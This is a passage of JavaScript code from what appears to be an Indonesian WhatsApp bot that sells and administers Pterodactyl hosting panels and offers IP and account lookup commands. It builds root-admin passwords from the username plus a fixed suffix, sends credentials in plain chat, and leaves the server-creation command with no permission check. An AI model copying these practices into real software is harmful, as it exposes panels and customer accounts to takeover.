if (t.length < 3) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"adm910"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = m.reply(`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *UUID :* ${user.uuid}
┃ *Username :* ${user.username}
┃ *Email :* ${user.email}
┃ *Admin :* ${user.root_admin}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Data sudah di kirim ke pripat chet`)
let teksnyo = `
*BERIKUT DATA ADMIN PANEL ANDA* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *Email :* ${user.email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛`+readmore+`
*PROFIT :*
- *BISA CREAT PANEL*

*RULES :*
- JOON GROUP UNTUK INFO
- *JAGA DATA BAIK BAIK*
- *HUB OWN JIKA ADA KENDALA*
- *SS PANEL DONE*
- *DI LARANG RUSUH*
- *DI LARANG NGINTIP SRV LAIN*
- *DI LARANG NYRI SC*
- *DI LARANG JUAL ADMIN*
- *DI LARANG DDOS PANEL*

*LANGGAR ? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANKS YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 LINK GROUP","url":"${gr}","merchant_url":"https://www.google.com"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
},
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break

case 'cpanel': {
if (!m.isGroup) return m.reply("Maaf Fitur ini hanya dapat di gunakan di group yang susah memiliki akses dari owner")
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return reply2(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let sections = [{
title: 'SILAHKAN PILIH RAM PANEL YANG AKAN DI BUAT',
highlight_label: 'Bagian Yang Akan Di Pilih',
rows: [{
title: '1 GB', 
description: "RAM 1 GB CPU 30%", 
id: `.cp1gb ${username},${u}`
}, {
title: '2 GB', 
description: "RAM 2 GB CPU 60%", 
id: `.cp2gb ${username},${u}`
}, {
title: '3 GB', 
description: "RAM 3 GB CPU 90%", 
id: `.cp3gb ${username},${u}`
}, {
title: '4 GB', 
description: "RAM 4 GB CPU 120%", 
id: `.cp4gb ${username},${u}`
}, {
title: '5 GB', 
description: "RAM 5 GB CPU 150%", 
id: `.cp5gb ${username},${u}`
}, {
title: '6 GB', 
description: "RAM 6 GB CPU 180%", 
id: `.cp6gb ${username},${u}`
}, {
title: '7 GB', 
description: "RAM 7 GB CPU 210%", 
id: `.cp7gb ${username},${u}`
}, {
title: '8 GB', 
description: "RAM 8 GB CPU 240%", 
id: `.cp8gb ${username},${u}`
}, {
title: '9 GB', 
description: "RAM 9 GB CPU 270%", 
id: `.cp9gb ${username},${u}`
}, {
title: '10 GB', 
description: "RAM 10 GB CPU 300%", 
id: `.cp10gb ${username},${u}`
}, {
title: 'UNLI 1', 
description: "RAM UNLI CPU 1000%", 
id: `.cpunli1 ${username},${u}`
}, {
title: 'UNLI 2', 
description: "RAM UNLI CPU 2000%", 
id: `.cpunli2 ${username},${u}`
}, {
title: 'UNLI 3', 
description: "RAM UNLI CPU 3000%", 
id: `.cpunli3 ${username},${u}`
}, {
title: 'UNLI 4', 
description: "RAM UNLI CPU 4000%", 
id: `.cpunli4 ${username},${u}`
},
 {
title: 'UNLI ALL',
description: `Unlimited Ram/Cpu`, 
id: `.cpunliall ${username},${u}`
}]
}]

let listMessage = {
    title: 'LIST RAM PANEL BY REREZ HOSTING 📡', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'CREATE BY REREZ HOSTING', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`SILAHKAN PILIH RAM PANEL YANG AKAN ANDA BUAT`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${pushname}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/495eb10844be2ddf75b8e.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case 'detusr': {
if (!isCreator) return reply2(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return reply2('*USER NOT FOUND*')
let u = res.attributes
reply2(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break

case 'listsrv': {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    var status = data.attributes ? data.attributes.current_state : s.status;  
  
  }
  
  RezzHost.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By Rerez", {
                    title: `Total Server: ${res.meta.pagination.count}`, sections: [{
                        title: "List Servers Panel",
                        rows: servers.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${status}`,
                                description: a.attributes.name,
                                id: `.delsrv ${a.attributes.id}`
                        }))
                    }]
                })
                
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'listusr': {
  if (!isCreator) return reply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  
  messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
  RezzHost.sendList(m.chat, messageText, "Powered By Rerez", {
                    title: totalUsr, sections: [{
                        title: "List Users Panel",
                        rows: users.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
                                description: a.attributes.username,
                                id: `.delusr ${a.attributes.id}`
                        }))
                    }]
                })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'delsrv': {
      if (!isCreator) return reply(`KHUSUS OWN`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case 'delusr': {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case 'addusr': {
if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
RezzHost.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break

case 'listadmin': {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await RezzHost.sendMessage(m.chat, { text: messageText }, { quoted: kalgans });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply2(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'addsrv': {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`NGAPAIN ANJG`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
RezzHost.sendMessage(mq1, {text:`*───❖》${ownername}《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break             
case 'webpanel':
if (!isCreator) return reply(mess.owner)
ewe = `nih kak ${domain}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply2(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply2('*SERVER NOT FOUND*')
           reply2('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply2(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply2('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply2('*SERVER NOT FOUND*')
           reply2('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('kusus Owner')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break


// BATAS PANEL MENU


// STALK MENU


case 'githubrepo': {
if(!text) return reply2(`${command} sanzy`)
let po = await skyu.githubRepo(text)
let txt = `*L I S T - R E P O*\n\n`
for (let rep of po.result) {
txt += `   ◦  *Id :* ${rep.id}\n`
txt += `   ◦  *Name :* ${rep.name_repo}\n`
txt += `   ◦  *FullName :* ${rep.full_name_repo}\n`
txt += `   ◦  *UrlRepo :* ${rep.url_repo}\n`
txt += `   ◦  *Description :* ${rep.description}\n`
txt += `   ◦  *Git Url:* ${rep.git_url}\n`
txt += `   ◦  *Clone Url :* ${rep.clone_url}\n`
txt += `   ◦  *Homepage :* ${rep.homepage}\n`
txt += `   ◦  *StarGazers* : ${rep.stargazers}\n`
txt += `   ◦  *Watchers* : ${rep.watchers}\n`
txt += `   ◦  *Forks* : ${rep.forks}\n`
txt += `   ◦  *Language* : ${rep.language}\n`
txt += `   ◦  *Created* : ${rep.created_at}\n`
txt += `   ◦  *Update* : ${rep.update_at}\n\n`
}
txt += `${footer}`
reply2(txt)
}
break
case 'codstalk': {
if (!text) throw `Input ID!\n\nExample: ${prefix + command} 6290150021186841472`
let kemii = await fetchJson(`https://api.lolhuman.xyz/api/codm/${text}?apikey=${apikey}`)
reply(`${kemii.result}`)
}
break
case 'npmjs': {
if (!text) return reply('Input Package Name')
let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
let { objects } = await res.json()
if (!objects.length) throw `Query "${text}" not found :/`
let txt = objects.map(({ package: pkg }) => {
return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
}).join`\n\n`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 N P M J S`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'itunes': {
if (!text) throw `[ ! ] *example:* ${prefix + command} ignorance`
reply(mess.search)
	try {
		let anu = await fetchJson(`https://api.popcat.xyz/itunes?q=${text}`)
		let txt = `*${anu.name}*\n\n`
		txt += `*artist :* ${anu.artist}\n`
		txt += `*album :* ${anu.album}\n`
		txt += `*release_date :* ${anu.release_date}\n`
		txt += `*price :* ${anu.price}\n`
		txt += `*length : ${anu.length}*\n`
		txt += `*genre : ${anu.genre}*\n`
		txt += `*link :* ${anu.url}\n\n`
		txt += `${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 I T U N E S`,
body: '',
thumbnailUrl: anu.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
	} catch (e) {
		console.log(e)
		throw 'title not found.'
	}
}
break
case 'ytchanel':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} zeeonceofc`)
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/ytchannel?apikey=${apikey}&query=${text}`)
let teks = `乂 *Y T C H A N N E L - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. ${v.channel_name}\n`
teks += `*Channel Id* : ${v.channel_id}\n`
teks += `*Nama* : ${v.channel_name}\n`
teks += `*Keterangan* : ${v.channel_about}\n`
teks += `*Created* : ${v.channel_created}\n\n\n───────────────\n\n`
}).join('\n\n')
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 Y T - S T A L K`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'ipstalk': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Mana IP nya??')
reply(mess.search)
let ips = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${args[0]}?apikey=${apikey}`)
ipsd = `乂 I P - S T A L K

   ◦  Country : ${ips.result.country}
   ◦  CountryCode : ${ips.result.countryCode}
   ◦  Region : ${ips.result.region}
   ◦  City : ${ips.result.city}
   ◦  Zip : ${ips.result.zip}
   ◦  Lat : ${ips.result.lat}
   ◦  Lon : ${ips.result.lon}
   ◦  TimeZone : ${ips.result.timezone}
   ◦  Isp : ${ips.result.isp}
   ◦  Org : ${ips.result.org}
   ◦  As : ${ips.result.as}
   ◦  Query : ${ips.result.query}
   
${footer}`
RezzHost.sendMessage(m.chat, {
                        text: Styles(ipsd),
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: `https://telegra.ph/file/affa505d7d15ec7eeae3e.jpg`,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
			}
			break
case 'pbstalk': {
			if (args.length == 0) return reply(`No Query id, Example: ${prefix + command} pb riio46`)
			reply(mess.search)
			let anu = await fetchJson(`https://pitucode.com/stalker/nickpb?apikey=${pitu}&query=${args[0]}`)
